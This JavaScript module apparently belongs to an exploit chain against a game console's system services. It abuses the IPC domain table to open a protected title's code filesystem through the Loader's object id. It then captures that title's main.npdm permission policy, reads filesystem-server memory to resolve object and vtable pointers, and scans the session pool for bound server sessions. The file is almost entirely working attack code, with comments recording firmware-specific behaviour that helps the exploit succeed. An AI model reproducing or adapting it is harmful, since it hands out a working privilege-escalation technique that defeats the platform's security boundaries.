// kaiHEN port — CodeFS through the copied Loader root: open the RO title's
// code filesystem, capture its main.npdm (the donor policy), convert the
// CodeFS session to a domain, and compare adapter types with the donor.

import runtime from "../core/runtime.mjs";
import {check, khLog, hex, u64Bytes, readU64LE, readU32LE, readNative,
    track, arenaSlots, bytesToHex, RO_TITLE} from "./state.mjs";
import {cmifSend, requireOk, oneMovedHandle} from "./wire.mjs";
import {readFs, fsPointer} from "./endpoint.mjs";
import {sha256} from "./sha256.mjs";

const {closeHandle, writeStr} = runtime;

// OpenCodeFileSystem routed through a domain session to the Loader's shared-
// table object id, then copied out as a plain session. Replaces the borrowed-
// entry copy route: that session is born dead on this firmware (kernel 0xF601
// session-closed at first send — DX0 pre-restore, DX2/DX3 post-restore, while
// legitimate CopyFromCurrentDomain clones like fsRootPlain transport fine).
// The domain table is one native namespace, so a domain request addressed to
// the Loader's entry id dispatches to the Loader's object; the returned
// CodeFS lands as a domain object we copy out through a legitimate entry.
export async function openCodeFileSystemViaDomain(context, domainHandle,
        loaderObjectId, title) {
    const slots = arenaSlots(context);
    for (let i = 0; i < 32; i++)
        runtime.write8(slots.info + BigInt(i), 0x5cn);
    for (let i = 0; i < 0x1a4; i++)
        runtime.write8(slots.info + BigInt(32 + i), 0);
    for (let i = 0; i < 32; i++)
        runtime.write8(slots.info + BigInt(32 + 0x1a4 + i), 0x5cn);
    const input = [1, 3, 0, 0, 0, 0, 0, 0].concat(u64Bytes(BigInt(title)));
    const reply = cmifSend(domainHandle, {
        pkt: slots.pkt, cmd: 0, input, domain: loaderObjectId,
        b: [{addr: slots.info + 32n, size: 0x1a4}]
    });
    await khLog("DX5 domain-routed code-open transport=" + hex(reply.transport) +
        " result=" + hex(reply.result === undefined ? -1 : reply.result) +
        " objCount=" + (reply.objCount === undefined ? "-" : reply.objCount) +
        " moves=" + (reply.moves ? reply.moves.length : "-"));
    requireOk(reply, "DX5 domain-routed OpenCodeFileSystem");
    let codeId = 0;
    if (reply.objCount === 1) {
        codeId = Number(runtime.read32(slots.pkt +
            BigInt(reply.at + 32))) >>> 0;   // no inline data: ids at +32
        check(codeId > 0 && codeId <= 0x4000,
            "DX5 codefs object id out of table range: " + hex(codeId));
        await khLog("DX5 codefs object id " + hex(codeId));
    } else {
        check(reply.moves.length === 1,
            "DX5 returned neither a domain object nor a moved handle");
    }
    let handle;
    if (codeId) {
        // Copy the new object out through its own (legitimate) table entry.
        const copied = cmifSend(domainHandle, {pkt: slots.pkt2, control: true,
            cmd: 1, input: [codeId & 0xff, codeId >> 8 & 0xff,
                codeId >> 16 & 0xff, codeId >> 24 & 0xff], rawWords: 9});
        handle = oneMovedHandle(copied, "DX5 codefs copy-out");
        await khLog("DX5 codefs copied out as " + hex(handle));
    } else {
        handle = reply.moves[0];
    }
    track(context, handle, "codefs");
    for (let i = 0; i < 32; i++) {
        check(runtime.read8(slots.info + BigInt(i)) === 0x5cn &&
            runtime.read8(slots.info + BigInt(32 + 0x1a4 + i)) === 0x5cn,
            "code-info output exceeded its buffer");
    }
    const info = readNative(slots.info + 32n, 0x1a4);
    const entry = {handle, title: title.toString(),
        codeInfo: {isSigned: info[0x1a0],
            targetHash: bytesToHex(info.slice(0x1a4 - 0x24, 0x1a0))}};
    context.codefs = entry;
    return entry;
}

// Adopt a CodeFS already opened by the instant-send probe (the domain-
// routed WithContext path): build the standard entry from the moved handle
// and the request's code-info receive buffer.
export function adoptCodeFileSystem(context, handle, infoAddr, added) {
    track(context, handle, "codefs");
    const info = readNative(BigInt(infoAddr), 0x1a4);
    const entry = {handle, title: "instant", added,
        codeInfo: {isSigned: info[0x1a0],
            targetHash: bytesToHex(info.slice(0x1a4 - 0x24, 0x1a0))}};
    context.codefs = entry;
    return entry;
}

// OpenCodeFileSystem (cmd 0) on the copied Loader root with a B-descriptor
// code-info output. Returns the CodeFS handle (kept in the game).
export function openCodeFileSystem(context, sourceRootHandle, title) {
    const slots = arenaSlots(context);
    // Guard around the info output to prove it did not overflow.
    for (let i = 0; i < 32; i++)
        runtime.write8(slots.info + BigInt(i), 0x5cn);
    for (let i = 0; i < 0x1a4; i++)
        runtime.write8(slots.info + BigInt(32 + i), 0);
    for (let i = 0; i < 32; i++)
        runtime.write8(slots.info + BigInt(32 + 0x1a4 + i), 0x5cn);
    const input = [1, 3, 0, 0, 0, 0, 0, 0].concat(u64Bytes(BigInt(title)));
    const reply = cmifSend(sourceRootHandle, {
        pkt: slots.pkt, cmd: 0, input,
        b: [{addr: slots.info + 32n, size: 0x1a4}]
    });
    if (reply.transport !== 0) {
        let dump = "";
        for (let i = 0; i < 16; i++)
            dump += (dump ? " " : "") + hex(Number(runtime.read32(slots.pkt +
                BigInt(i * 4))));
        khLog("OpenCodeFileSystem transport " + hex(reply.transport) +
            " handle " + hex(sourceRootHandle) + " reply words: " + dump);
    }
    check(reply.transport === 0, "OpenCodeFileSystem transport " + hex(reply.transport));
    check(reply.result === 0, "OpenCodeFileSystem failed: " + hex(reply.result));
    check(reply.moves.length === 1, "OpenCodeFileSystem returned no filesystem");
    const handle = reply.moves[0];
    track(context, handle, "codefs");
    for (let i = 0; i < 32; i++) {
        check(runtime.read8(slots.info + BigInt(i)) === 0x5cn &&
            runtime.read8(slots.info + BigInt(32 + 0x1a4 + i)) === 0x5cn,
            "code-info output exceeded its buffer");
    }
    const info = readNative(slots.info + 32n, 0x1a4);
    const entry = {handle, title: title.toString(),
        codeInfo: {isSigned: info[0x1a0],
            targetHash: bytesToHex(info.slice(0x1a4 - 0x24, 0x1a0))}};
    context.codefs = entry;
    return entry;
}

// Capture one file from the CodeFS by name (fully, bounded).
export function captureCodeFile(context, codeHandle, name, limit) {
    const slots = arenaSlots(context);
    writeStr(slots.path, "/" + name);
    const opened = cmifSend(codeHandle, {
        pkt: slots.pkt, cmd: 8,
        x: [{addr: slots.path, size: 0x301}],
        input: [1, 0, 0, 0]
    });
    requireOk(opened, "code open /" + name);
    const child = oneMovedHandle(opened, "code file /" + name);
    try {
        const sizeReply = cmifSend(child, {pkt: slots.pkt2, cmd: 4,
            input: [], rawWords: 8});
        requireOk(sizeReply, "code size /" + name);
        const size = readU64LE(
            readNative(slots.pkt2 + BigInt(sizeReply.dataAt), 8), 0);
        const length = limit ? Number(size > BigInt(limit) ? BigInt(limit) : size)
            : Number(size);
        check(length > 0 && length <= 0x100000, "unexpected /" + name + " size " + size);
        const parts = [];
        for (let at = 0; at < length; at += 0x10000) {
            const sizeChunk = Math.min(0x10000, length - at);
            const reply = cmifSend(child, {
                pkt: slots.pkt, cmd: 0,
                input: u64Bytes(0n).concat(u64Bytes(BigInt(at)))
                    .concat(u64Bytes(BigInt(sizeChunk))),
                b: [{addr: slots.data, size: sizeChunk}]
            });
            requireOk(reply, "code read /" + name);
            parts.push(readNative(slots.data, sizeChunk));
        }
        let all = [];
        for (const part of parts) all = all.concat(part);
        return {name, bytes: all, size: Number(size), captured: length,
            sha256: sha256(all)};
    } finally {
        closeHandle(child);
    }
}

// Convert the CodeFS session to a domain; returns {root, entry, object, ...}
// resolved against the FS domain table (used by the adapter-type compare).
export async function codeDomain(context, codeHandle) {
    const slots = arenaSlots(context);
    const converted = cmifSend(codeHandle, {pkt: slots.pkt, control: true,
        cmd: 0, input: [], rawWords: 8});
    requireOk(converted, "CodeFS ConvertToDomain");
    const root = Number(runtime.read32(slots.pkt + BigInt(converted.dataAt))) >>> 0;
    check(root > 0 && root <= 0x4000, "CodeFS domain id out of range: " + root);
    const entry = context.layout.table + (root - 1) * 0x30;
    const entryBytes = await readFs(context, entry, 0x30);
    const object = Number(readU64LE(entryBytes, 0x20));
    const metadata = Number(readU64LE(entryBytes, 0x28));
    const header = await readFs(context, object, 0x40);
    const row = {name: "code", handle: codeHandle, root, entry,
        domain: Number(readU64LE(entryBytes, 0x18)), object, metadata,
        vptr: Number(readU64LE(header, 0))};
    check(row.domain >= 0x100000000 && row.object >= 0x100000000 &&
        row.object < 0x8000000000,
        "CodeFS domain entry has no live owner or object");
    context.codeRow = row;
    return row;
}

// Resolve the donor's domain row the same way (donor.root from its session).
export async function donorDomainRow(context) {
    const donor = context.donor;
    check(donor && donor.root, "donor is not converted to a domain");
    const entry = context.layout.table + (donor.root - 1) * 0x30;
    const entryBytes = await readFs(context, entry, 0x30);
    const object = Number(readU64LE(entryBytes, 0x20));
    const header = await readFs(context, object, 0x40);
    const row = {name: "donor", handle: donor.handle, root: donor.root, entry,
        domain: Number(readU64LE(entryBytes, 0x18)), object,
        metadata: Number(readU64LE(entryBytes, 0x28)),
        vptr: Number(readU64LE(header, 0)),
        // The owning-reference tail (bytes 0x18..0x30) is compared before
        // the launch exchange (reference launch.cjs currentDonor check).
        entryTail: entryBytes.slice(0x18)};
    check(row.domain >= 0x100000000 && row.object >= 0x100000000 &&
        row.object < 0x8000000000,
        "donor domain entry has no live owner or object");
    context.donorRow = row;
    return row;
}

// The reference requires donor and code adapter types to match exactly.
export function verifyAdapterTypes(context) {
    const donor = context.donorRow, code = context.codeRow;
    check(donor && code, "adapter types need donor and code rows");
    check(donor.metadata === code.metadata && donor.vptr === code.vptr,
        "filesystem adapter types differ (donor vptr=" + hex(donor.vptr) +
        " code vptr=" + hex(code.vptr) + ")");
    return true;
}

// -- Server-session bindings (bind-sessions) -----------------------------------

// Find the two bound server sessions (our inspection domain's and the
// Loader's) in the session pool and validate their shape.
export async function bindSessions(context) {
    const layout = context.layout;
    const checkDomains = [context.loaderCopy.ownDomain, context.loaderRoot.domain];
    const bytes = await readFs(context, layout.slots, 0x10000);
    const rows = [];
    for (let i = 0; i + 0x88 <= bytes.length; i += 0x88) {
        const domain = readU64LE(bytes, i + 0x70);
        if (readU64LE(bytes, i) !== BigInt(layout.holderVptr)) continue;
        if (!checkDomains.includes(Number(domain))) continue;
        const row = {address: layout.slots + i, domain: Number(domain),
            parent: Number(readU64LE(bytes, i + 0x28)),
            wait: readU32LE(bytes, i + 0x30),
            tag: readU64LE(bytes, i + 0x38), state: readU32LE(bytes, i + 0x40),
            receiveResult: readU32LE(bytes, i + 0x44),
            receive: readU32LE(bytes, i + 0x48),
            request: Number(readU64LE(bytes, i + 0x60)),
            capacity: readU64LE(bytes, i + 0x68),
            metadata: Number(readU64LE(bytes, i + 0x78)),
            raw: bytesToHex(bytes.slice(i, i + 0x88))};
        check(row.wait === row.receive && row.capacity === 0x100n &&
            row.tag === 1n && row.state === 1 &&
            layout.waiters.includes(row.parent),
            "server-session shape differs at " + hex(row.address));
        rows.push(row);
    }
    check(rows.length === 2 && new Set(rows.map(r => r.domain)).size === 2,
        "server bindings are not unique: " + rows.length + " rows for domains " +
        checkDomains.map(hex).join(","));
    context.bound = {rows, waiters: layout.waiters};
    await khLog("bound sessions: " + rows.map(r =>
        hex(r.address) + "/dom=" + hex(r.domain)).join(" "));
    return context.bound;
}
